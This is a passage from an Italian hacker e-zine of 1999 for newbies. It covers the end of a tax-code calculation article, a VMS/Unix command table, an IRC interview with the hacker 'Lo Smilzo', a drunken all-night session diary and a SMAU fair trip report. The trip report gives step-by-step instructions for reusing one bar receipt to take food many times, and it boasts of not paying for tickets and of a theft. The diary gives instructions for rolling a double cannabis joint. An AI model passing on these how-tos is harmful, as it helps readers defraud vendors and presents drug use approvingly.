 10=K  11=L  12=M  13=N  14=O  15=P  16=Q  17=R  18=S  19=T |
 20=U  21=V  22=W  23=X | 24=Y | 25=Z       |                  |
+------+------+------+------+------+------+------+------+------+------+
                                                                  tab 4

il codice fiscale completo del nostro amico massimiliano e' quindi

                       -= CSS MSM 11M11 L447Q =-

fiuu ce lho fatta..! :)
piccola nota: c'ho messo 3 giorni a capire che il resto di una divisione
non sono i numeri dopo la virgola del quoziente =))

beh siamo proprio alla fine
vostro 0xF3A0ED00 vejeta <administrator@penguinpowered.com>
flames > /dev/null (x chi non avesse capito.. capite :)
CIAOZ

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

Ciao a tutti sono IronMan. Anche io, come tutti i collaboratori di questa
rivista (penso), sono un newbie. Il mio piu' grande desiderio e' diventare un
hacker pero' ... ne ho di strada da fare (pure parecchia! =). Se volete
chiedermi qualcosa o volete fare dei commenti o volete darmi dei suggerimenti
o volete dirmi che siete miei ammiratori (^_^) mandatemi un'email a
kewl@operamail.com. Ciao a tutti e a presto con il secondo pezzo dell'RFC =).

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

               ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
               ÷ִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
               ÷³ BREVE CONFRONTO COMANDI TRA VMS E UNIX ³÷
               ÷ְִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ÷
               ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

FUNZIONE COMANDI              VMS                     UNIX
--------------------------------------------------------------------------------
mostra la lista dei file      DIRECTORY               ls
                              DIRECTORY/FULL          ls -l
mostra il contenuto dei file  TYPE                    cat
display file with pauses      TYPE/PAGE               more, less
mostra le prime righe di un file (5 di default)       head
mostra le ultime righe di un file (5 di default)      tail
copia un file                 COPY                    cp
cerca una stringa in un file  SEARCH                  grep
                                                      fgrep
confronta dei file            DIFF                    diff
                                                      cmp
rinomina file                 RENAME                  mv
cancella file o directory     DELETE                  rm
                                                      rmdir
cambia la protez. dei file    SET FILE/PROT           chmod
cambia possessore dei file    SET FILE/OWNER          chown
                                                      chgrp
crea una directory            CREATE/DIR              mkdir
cambia la dir corrente        SET DEFAULT             cd
mostra la dir corrente        SHOW DEFAULT            pwd
richiama l'help in linea      HELP                    man
                                                      apropos
mostar data e ora             SHOW TIME               date
mostra spazio libero su disco SHOW DEV                df
ferma i processi              STOP                    kill
collega i moduli              LINK                    ld
stampa file                   PRINT                   lpr
mostra le stampe in coda      SHOW QUEUE              lpq
mostra le stampe in entrata   SHOW ENTRY              lpq
cambia la password            SET PASSWORD            passwd
mostra gli utenti collegai    SHOW USERS              who
                                                      finger
                                                      w
mostra i processi             SHOW PROCESS            ps
cambia le imp. dei terminali  SET TERMINAL            stty
parla a un altro utente       PHONE                   talk
disabilita messaggi           SET NOBROADCAST         mesg n

Questo testo e' di Dave Atkin della University of York e la traduzione e'
stata fatta da N0bodY88 che almeno cerca di essere utile traducendo ;)

Byez                                                    N0bodY88


"Il dolore ancora una volta non mi uccide,
 il dolore ancora una volta mi rende + forte,
 ma stanotte di questa forza non so che farmene.
 Davvero."
"Overminder - Il Sognatore" di Akira Mishima

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ
²°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°²²²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

                  ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
                  ÷ִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
                  ÷³       INTERVISTA ALLO SMILZO       ³÷
                  ÷ְִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ÷
                  ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

Session Start: Mon Oct 18 22:44:12 1999
Session Ident: Smilzo (LustMaster@illo.ip.dello.smilzo)

<Smilzo> salve
<N0bodY88> ciaoooooo
<N0bodY88> x l'intervista... va bene adesso?
<Smilzo> a me va bene adesso :)
<N0bodY88> okki
<N0bodY88> allora prima di tutto grazie x concederci sta intervista :)
<N0bodY88> e poi
<N0bodY88> "presentati a quei pochi morti di fame che sono appena tornati da
<N0bodY88> marte in treno e che non ti conoscono, chi sei che fai e che fai de
<N0bodY88> male x esse ricercato in 34 regioni italiane (ma ce en so cosi'
<N0bodY88> tante??? hihihi)
<Smilzo> Allora, sono Lo Smilzo, ho avuto la sfortuna di essere in un libro
<Smilzo> (spaghettihacker), sono una smanettone (casa mia sembra "One time TV"
<Smilzo> di max headroom), faccio l'amministratore di sistema,
<Smilzo> ed ESISTOOOOOOO!! :)
<N0bodY88> da quanto e' che sei nella scena o cmq giri in rete?
<Smilzo> giro in rete da novembre 93
<Smilzo> ma
<Smilzo> prima andavo in giro su fidonet
<N0bodY88> come ti definiresti tu? hacker cracker sysadmin o cosa?
<Smilzo> Sysadm fallito ;)
<Smilzo> heheh
<Smilzo> scherzo
<Smilzo> mi ritengo un smanettone..
<N0bodY88> cosa ti affascina di+ di tutto questo mondo?
<Smilzo> [MODE Messaggio promozione ON]
<Smilzo> Come dice il libro Spaghetti Hacker di Chiccarelli e Monti :)
<Smilzo> [MODE Messaggio promozione OFF]
<Smilzo> tante cose...
<Smilzo> che si possono imparare tante cose..
<Smilzo> e l'aspetto sociale..
<Smilzo> nel senso che
<Smilzo> c'e' l'aria della "famiglia"
<N0bodY88> okki :)
<N0bodY88> tu sei stato in qualke modo coinvolto nel crackdown o meglio giro
<N0bodY88> di vite del 94 in italia?
<Smilzo> assulutamente no.. :))
<Smilzo> signor maresciallo.. non so' neache cosa e' un compiuter :)
<Smilzo> hehehe
<N0bodY88> hihihi
<N0bodY88> cosa ne pensi sinceramente di questo boom di linux-maniaci...
<N0bodY88> cioe'
<N0bodY88> pensi che la maggior parte sia x moda
<N0bodY88> o xche' veramente hanno capito la mentalita'
<N0bodY88> che sta alla base del free software?
<N0bodY88> chiedo a te anke se non centra sapendo che ne hai viste tante ;)
<Smilzo> sencondo me.. una parte e' per la moda, perche', "'ngulo linux, lo
<Smilzo> usano gli hacker"
<Smilzo> altri.. lo fammi per essere contro, come votare la lega
<Smilzo> pero' la percentuale di persone che vogliono aderire alla filosofia
<Smilzo> del freesoftware sta' crescendo
<N0bodY88> k
<Smilzo> beh
<Smilzo> e non lo dico solo io
<Smilzo> ma anche grandi case software stanno sviluppando per linux, come
<Smilzo> ad esempio la corel :)
<N0bodY88> tu come vedi adesso
<N0bodY88> tutto questo proliferare di santoni/guru hacker e di e-zine +o-
<N0bodY88> utili e +o- fatte bene/male?
<N0bodY88> dici che e' un bene rispetto al passto
<N0bodY88> dove giravano poche info?
<Smilzo> beh.. se vedi la scena come una piramida rovesciata..
<Smilzo> si stanno allargando le basi
<Smilzo> :)
<N0bodY88> eheheh bella risposta :)
<N0bodY88> cosa diresti se domani venisse qualcuno
<N0bodY88> e ti chiedesse "insegnami tutto"?
<Smilzo> risposta zen :)
<Smilzo> gli direi
<Smilzo> "sentimi... ma alla tua eta', non hai qualcosa di meglio da fare? :)
<N0bodY88> =) hihihi
<N0bodY88> posso farti na domanda del tipo che ne pensi della sicurezza sulla
<N0bodY88> rete esiste veramente?
<Smilzo> io occupandomi di sicurezza ti dico subito
<Smilzo> domandami tutto... tranne la matematica :)
<Smilzo> il problema che la maggior parte delle ditte non assume persone
<Smilzo> qualificate a fare i sistemisti..
<Smilzo> che normalmente una volta installato e (spesso mal) consigurato le
<Smilzo> macchine non le toccano piu' convinti che le patch non servano..
<Smilzo> come dove sto' lavorando adesso
<Smilzo> ho dovuto mettere a posto un intero provider da capo a piedi perche'
<Smilzo> l'ex-sistemista era un vero e prorpio imbecille..
<N0bodY88> cax!
<N0bodY88> ma tu fai lavori inerenti al campo dell'hacking...ma cosa fai
<N0bodY88> durante lavoro ? ;)
<N0bodY88> detto brutalmente lo so...
<Smilzo> beh... ti dico subito, quando lavoro, cado in trance davanti al
<Smilzo> server, diventando una mio altro arto :)
<Smilzo> beh.. quando lavoro.. lavoro e basta..
<Smilzo> quando sto' a casa..
<Smilzo> lavoro... e forse faccio qualcosa..
<Smilzo> :)
<Smilzo> heheh
<N0bodY88> miticuzzzz
<N0bodY88> allora
<N0bodY88> quale e' stata la cosa
<N0bodY88> + bella che ti sia mai successa?
<N0bodY88> e quale e' stata la piu' brutta?
<N0bodY88> riguardo pc - amici bustati - blitz - hacking - pula vedi tu ;)
<N0bodY88> se ti va di dirle ovviamente
<Smilzo> la piu' brutta
<Smilzo> uno scherzo organizzatomi da Andrea Monti e Stefano Chiccarelli
<Smilzo> un falso busting
<Smilzo> li avrei uccisi..
<Smilzo> la piu' bella
<Smilzo> mhh
<Smilzo> beh
<Smilzo> se mi fossi innamorato di una ragazza sulla rete... .. direi lei..
<Smilzo> pero' non e' cosi' :)
<N0bodY88> eheheh
<Smilzo> la cosa piu' bella..
<Smilzo> LA RETE!!!
<Smilzo> cmq.. la cosa piu' bella e' stata quando io e merc
<Smilzo> ognuna da casa propria
<Smilzo> lui si e' connesso in ftp su di me..
<Smilzo> nel 93
<Smilzo> ai tempi delle prima connessioni slip
<Smilzo> e abbiano capito, cosa vuol dire avere un ip :)
<N0bodY88> eheheh che bello aver vissuto i primi tempi!!!
<N0bodY88> ci puoi raccontare
<N0bodY88> come e' nata l'olografix e il ruolo di stefano e andrea monti
<N0bodY88> nelle vicende e nella manifestazioni hack degli ultimi anni
<N0bodY88> e di come sono riusciti a pubblicare quel mito di libro?
<Smilzo> qua' va fatto un discorso
<N0bodY88> parti pure :)
<Smilzo> la metro olografix e l'hacking sono due cose diverse
<N0bodY88> e parla dei centri degli hack lab dell'hack it quello che vuoi
<N0bodY88> sisisisi lo so ma se ti va parla di entrambi
<Smilzo> ok
<Smilzo> vado :)
<Smilzo> la metro e' un'associazione che e' nata perche' ci trovavamo
<Smilzo> a pescara con un modem, alcuno erano sysop...
<Smilzo> altri erano utenti di bbs
<Smilzo> e abbiamo deciso di metterci insieme....
<Smilzo> beh
<Smilzo> per quanto riguargarda stefano e andrea, potresti questa domanda
<Smilzo> direttamente a loro :)
<N0bodY88> ...se li sentissi =)
<N0bodY88> ultima domanda e via ;)
<Smilzo> ok :)
<Smilzo> spara
<N0bodY88> Com'e' stato x te l'hack-it?
<Smilzo> l'hackit e' stato per me una manifestazione folkloristica
<Smilzo> carina..
<Smilzo> anche sono contrario allo svoglimentro dentro i centro sociali
<Smilzo> specialmente il 2000 a roma..
<N0bodY88> miii! immagino il caos (e la marea di pulotti in borghese)!!!
<Smilzo> non e' tanto quello il problema..
<Smilzo> e' che ti immagini se devi uscire dall'hackit.. e andare a farti
<Smilzo> un giro ?
<Smilzo> non puoi..
<Smilzo> facciamo i segregati..
<N0bodY88> tnx 1000 x averci rilasciato questa intervista dedicandoci il tuo
<N0bodY88> tempo anke se una bella esclusiva tinta di rosso su come e' stato
<N0bodY88> dormi' con spirit e berry ce l'avresti potuta dare almeno...hihihi
<Smilzo> un'esperienza che mi ha soddisfatto e riempito molto
<Smilzo> eheh
<N0bodY88> okki tnx di tutto adesso devo scappa :)
<N0bodY88> ci si bekka okki? ciauz
<Smilzo> byez

Session Close: Mon Oct 88 88:88:88 1988
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

           ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
           ÷ִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
           ÷³  ARTICOLOZZO BY HARLOK - BLINKING - N0BODY88  ³÷
           ÷ְִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ÷
           ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

DATA: 29/8/99
ORA: 1:44 e non di pomeriggio ;)
ORA INIZIO BALDORIE: abbiamo bevuto troppo per ricodarcelo...
KANNE FUMATE: tutte da Harlok =) (modestamente ^_^ e dopo fumo ancora)
SENSAZIONI PROVATE DA BLINKING BEVENDO LA RED BULL: 

Allora comincio col dire che non so perche' sono qui col portatile a scrivere
dato che non so cosa scrivere ma vediamo un po' di riordinare le idee...
allora...harlok e' qui accanto a me che maledice la sua shell di linux sul pc
di blinking mentre l'appena citato blinking e' alla ricerca del santo wingate
e il ns nobo...ovviamente e' qua che ve lo segnala :))))

Adesso prendo le redini io (HarLoK o se mi preferite piu' cattivo H4rL0K :))
perche' Nobody88 e' su irc! Per farvi capire quello che sta succedendo in
questo momento, siamo in camera di Blinking con tre pc collegati in rete
(uno sta girando col DOS, uno con Linux, l'altro con Windows :)) e ognuno
si fa i c4xx1 suoi su internet (almeno per il momento).

!!!SOSPENDIAMO MOMENTANEAMENTE LA TRASMISSIONE PER UN COMUNICATO URGENTE!!!

ZeroCool, dove eri oggi a MI, dato che io e Nobo abbiamo aspettato invano
una tua telefonata? Questa ce la paghi, perche' hai preferito il distretto
militare a noi!!!!!
VoI dANtUz e deViLNeT DOvE ErAVAte?

                               !! FINE COMUNICATO !!

Mentre continuo a scrivere, stanno telnettando Blinking.... secondo me e'
una donna che ci vuole provare cercando ogni tipo e strategia e di approccio.

In poche parole, stanotte vogliamo fare tremare quello che c'e' al di la'
della presa telefonica di camera Blinking :-D (i vari tubi dell'acqua e del
riscaldamento gestiti rigorosamente ed orgogliosamente con un server(ino) che
gira con Linux MarioBross 4.2).
Abbiamo deciso di mandare in tilt e i nostri tre bei cervellini ...

EUAAAAAALLLLLAAAAAA sono sempre io il vs nobo e adesso mentre blinking prova
l'hijacking nello stesso segmento di rete [by harlok: bastardo!!!!!!!!!!!!!
io ti stavo infamando e tu leggevi quello che scrivevo!!!!!!!!!!!!!!!!!!!!!]
...questo e' hacking raga...

E ora la parola al pluripremiato strafamoso e mega impegnato con la sua
consolle (alla consoll mimmo e...) Blinking e che lo spirito di BFI sia con
noi...

premesso che non sono famoso,non sono impegnato (anzi,cerco la tipa) la notte
si prospetta interessante sotto tutti i punti di vista...anche se harlock
e' sicuramente piu' disinvolto di me: un tipo di nome ViRuS ci sta provando...
HarLoK: non mi piace proprio avere incontri ravvicinati di questo tipo con
un Virus :)

cd/temp tab pswd (invio)
./ acca e poi tab
Blinking: "cerchi le connessioni con O stat"
ecc. ecc
Blinking ad Harlok: "smettila di scrivere cazzate"

...breve pausa di trasferimento tra casa di blinking e la casa di una amica
di harlok in cui ne succederanno delle belle...a proposito, blinking se ne
e' annato a dormire ed io e harlok giriamo sempre di piu' come zombi...by
N0bodY88...

...e ora ci sono io Harlok...dato che nobo e' delirante sul pavimento...
Saranno piu'o meno le 4.58 (cosi' mi dicono ma io non ci credo).
Ci siamo fumati un paio di.... e un "baffo" (su ideazione di nobo....),
ehi aspetta un momento: non sapete cosa  un baffo?!?!??! AlT! Dovete
innanzitutto preparare un filtro piuttosto lungo e preparare due cartine
con tutto l'occorrente necessario.......... Dopo di che si chiudono le due
canne una da una parte, una dall'altra in modo da avere una sola canna lunga.
Ah, dimenticavo..... dovete fare un buchetto al centro del mega filtro in modo
che possiate tirare.
Accendetele tutte e due e.... BOooM ! Vi sentirete una calda nube di fumo,
piacevole e delicata che invader… i vostri polmoni e vi colmera' di
piacere.... Ah, che bello!
Mi sembra di essere un dio come quando si guadagna l'accesso di root!
Se per caso vi entra fumo negli occhi.... bh! chiudeteli! Se iniziate a
scottarvi o avete paura di bruciarvi la barbetta... fabbricate un altro
filtrino ed inseritelo nel buchino del vosro megapalo (tiratevela pure)
    
      /------------------\-------------------/-----------------.\
     (          1         |        <>       |        2           )
      \.-----------------/-------------------\-----------------./
                                   /\
                                    \_____ buchino per tirare

     1. primo cannone
     2. secondo cannone
      _
     | |  
     | |  secondo filtrino
     |_|
                                   HarLoK
             (a me sembra piu' che altro un assorbente interno...)
                                  N0bodY88
            (che firma dopo la terza notte passata senza dormire...)
                                  Blinking
          (che la sua firma la mette nobo xche' blinking non e' qui...)

PS: allora l'art e' finito o meglio so che non ci capirete molto ma cmq e'
    stato bello trovarsi tra amici e smanettare un pokino quindi raga se
    organizzate qualke meeting fatecelo sapere che ne daremo notizia agli
    amici newbies, phreaker, cracker e hacker che riusciremo a contattare e
    convincere :)

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

                        _____  __  ___ ___    __  __   __ __
                       / ___/ /  |/  //   |  / / / /  / // /
                       \__ \ / /|_/ // /| | / / / /  / // /_
                      ___/ // /  / // ___ |/ /_/ /  /__  __/
                     /____//_/  /_//_/  |_|\____/     /_/
                   ____ _   __ _____  ___     _   __ ______ _____
                  /  _// | / // ___/ /   |   / | / // ____// ___/
                 / / /  |/ / \__ \ / /| |  /  |/ // __/   \__ \
                _/ / / /|  / ___/ // ___ | / /|  // /___  ___/ /
               /___//_/ |_/ /____//_/  |_|/_/ |_//_____/ /____/

                    - www.cazzatearuotalibera._p0nic0_.gov ;PPP -

=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=

{ dATE: 20/10/3999 }
{ vIVERI: due panini al prosciutto belli ripieni e una lattina di birra ;DD }
{ cOLONNA SONORA: 'Comunque vada sara' un successo' - Er Piotta }
{ aUTORI: _p0nic0_ & wInDmILL }

=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=

===[ pARTENZA ]==================================================================
PARTE -> (aRRIVA a bO) -> (aTTESA a bO) -> t. tOTALE -> aRRIVA a mI -> tIPO tRENO
4.33 --> 6.05 ----------> 22m -----------> 4.22h -----> 8.55 --------> rEG/iNTrEG
=================================================================================

=-=[ fUCK ]-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
...fAncUlo aLla sCuOla e a qUeI cAzZo dI pRof. cHe mI rItRoVo...
...fAnCuLo alLa tEleCoZzA...pErcHe'?!?!?!?!?!...
...
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

=-=[ dEDICHE ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
...tUTTI gLI aMICI dI #hACKERNOW, #aLBY00, #cACCA, #cYBERNET...
...N0bodY88 e coolzs per aver creato newbies, siete grandi!!! :DD...
...
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*

:*****PpPpPpP [ uNA dEDICA sPECIALE vA a: ] :****PpPpPpP :*****PpPpPpP :*****P

...alla mia OnyxGirl...
...non ci sono parole per esprimere quanto bene ti voglio...
...anche divisi, uniti per sempre :°°°°...
...

:*****PpPpPpP :*****PpPpPpP :*****PpPpPpP :*****PpPpPpP :*****PpPpPpP :*****Pp

=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*

=.=[ cOME sI rAGGIUNGE lO sMAU aRRIVANDO iN tRENO?? ].=.=.=.=.=.=.=.=.=.=.=.=.
La stazione ferroviaria e' collegata con la metropolitana (per Smau linea M1
direzione Molino Dorino fermate Amendola Fiera - Lotto Fiera. Dalla ferrovia
Nord (stazione Bullona) lo Smau e' raggiungibile a piedi =))
=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.

!.![ pARTE 1 (oVVERO) lA pARTENZA ].!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.
pARTECIPANTS: _p0nic0_ @ wInDmILL
cONTENTS: ore 4.10 { ci dirigiamo verso la stazione di ******* (evvabbe',
volete anche che vi dica dove abito?? ;DD)... e' chiusa :((.... sigh sigh...
e ora cosa si fa??? Intorno a noi una schiera di barboni dormienti...ihihih...
guarda quello sta facendo ginnastica... Cazzo non c'abbiamo manco i biglietti
e stiamo qui a vedere quei simpaticoni fare ginnastica???... Per fortuna
vediamo sbucare da dietro un'angolino un ometto su un trattorino elettrico
che annuncia l'apertura della station... iuppy!!! Corri corri che il treno
sta per partire... Smau stiamo arrivando...!!!!!!!!!! }
!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.

!.![ pARTE 2 (oVVERO) aRRIVO a mILANO ].!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.
pARTECIPANTS: _p0nic0_ @ wInDmILL @ Dark-Elf @ A-SyNcHr0 @ Sharra14 @ Adryana
cONTENTS: ore 8.55 { io e wInDmILL giungiamo alla stazione di Milano Centrale
... maiala che casino... fortuna che ci vengono a prendere... baci e abbracci
davanti al binario 12 e subito via verso l'uscita. }
!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.

!.![ pARTE 3 (oVVERO) sMAU - l'eNTRATA ]!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.
pARTECIPANTS: _p0nic0_ @ wInDmILL @ Dark-Elf @ A-SyNcHr0 @ Sharra14 @ Adryana
cONTENTS: ore 9.30ca { usciamo fuori dalla stazione metropolitana... dopo 5
ore passate in treno mentre fuori e' ancora tutto avvolto dalle tenebre ci
sembra di tornare a vivere... i nostri occhi si riabituano velocemente alla
luce e ci accorgiamo di essere finiti al mercato centrale di Napoli...
centinaia di persone che si affrettano a raggiungere l'entrata della fiera...
depliant ('Vola a scuola con TIN it'...mamma mia...), volantini e cartacce
dappertutto. Ed eccoci davanti all'entrata... code di una 20ina di metri ci
aspettano... figuratevi se noi stiamo li' a fare la coda...sgattaiolamo
silenziosamente fino al baracchino dei biglietti in circa 30sec (ihihih) ,
consegnamo i biglietti di ingresso ('non penserete mica che li abbia pagati
quei biglietti, vero????') e ci avventuriamo in questa meravigliosa giungla
chiamata Smau. }
!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.

!.![ pARTE 4 (oVVERO) sMAU - lA cREW (qUASI) aL cOMPLETO ]!.!.!.!.!.!.!.!.!.!.
pARTECIPANTS: _p0nic0_ @ wInDmILL @ Dark-Elf @ DeViLnEt @ A-SyNcHr0 @ guf0z
              @ Rubrik0 @ Sharra14 @ Adryana @ DragonMan @ Steal @ DeViLNeT
              @ CrackBoy @ NEOgmc @ Tia & boyfrind @ ATZero @ En|gMa @ DKK
              @ siamo tutti?
cONTENTS: ore 12ca { tralasciando chi prima chi poi, ci siamo ritrovati al bar
davanti al megaschermo PannaSonica (e' un brutto ricordo...vero rega'?) e
iniziamo a magna'...ma qua' scatta l'operazione hACKING sMAU bARs. In pratica
funzica cosi':
              | mATERIALE: un po' di money...giusto quanto basta per comprare
                           un panino, una lattina da bere e un gelato...
              | oBIETTIVO: pAGA 1 mAGNA 15 ;DDD
              | sVOLGIMENTO: il tutto e' molto semplice... consiste solo nel
                             comprare suddetto panino, qlc da bere e un gelato
                             (le varianti sono molte pero'...)
              | aLL'oPERA: andate dentro il bar dove troverete una marea di
                           gente accavallata l'una sull'altra... fate lo
                           scontrino e quando andate a prendere la roba da
                           mangiare badate bene di far vedere solamente lo
                           scontrino, senza darlo alle commesse che altrimenti
                           ve lo strapperanno e diventera' inutilizzabile...vi
                           assicuriamo che non e' difficile... provare per
                           credere! Ora che siete usciti con la vostra roba,
                           date lo scontrino al vostro amico che lo
                           riutilizzera', e poi lo ridara' e verra'
                           riutilizzato e riutilizzato per decine di volte
                           ....uazuaz....potete provare anche se ve lo hanno
                           strappato, tanto che vi frega???
                           ...ihihihi... fatelo rega'... ihihihihihi
              | eOF: con questo sistemino vi assicuriamo una perfetta resa
                     col pancino pieno...non e' cio' che volevate???? bhe',
                     se quest'anno avete speso 6.000e' a panino per mangiare
                     in quel cazzo di posto siete stai dei bei polli... cmq
                     speriamo che vi  sia servita di lezione... W gli
                     scontriniii!!! :PPPP
ebbene si... }
!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.

=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*
sCoOp sEnsAtIonAlE: iL gUf0 c?hA 39 aNn! !!!!!!!!!! ;DDDDDDD
=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*=-*

!.![ pARTE 5 (oVVERO) sMAU - aROUND SMAU ]!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.
bello, proprio bello questo posto...porterei via tutto...comprese le commesse
dello stand MicroShit ;DDD Cazzo, guarda quello...c'ha il collegamento coi
satellite...porko ***... 90kb al secondo... e io che giro col mio 33.6!!!!!
:\\\ Serverini IBM, 'nuovi prodotti MicroSuck', collegamenti via satellite...
che favola... ma vabbeh tanto c'eravate anche voi...quindi passiamo ai fatti
piu' divertenti hihih....far impazzire la commesse della telecozza hihihi
e' stata una bella cosa... ringrazio DeViLnEt per aver portato quel programmx
che ha fatto diventare pazze le fichettine del team telestronza... ah raga',
vogliamo le fotoooo!!!!
Cmq e' stato bello anche il 'colpo' di Rubrik0....ehehe chi c'era, sa...
uazuazuaz....mentre Dev e gli altri erano allo stand Tele*** Rubrik0 quatto
quatto stava portandosi via il suo trofeo ihihihihihih....evvabbe' via basta..
finiamola qui...
!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.?.!.

!.![ pARTE 6 | sALUTI E rINGRAZIAMENTI ]!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.!.
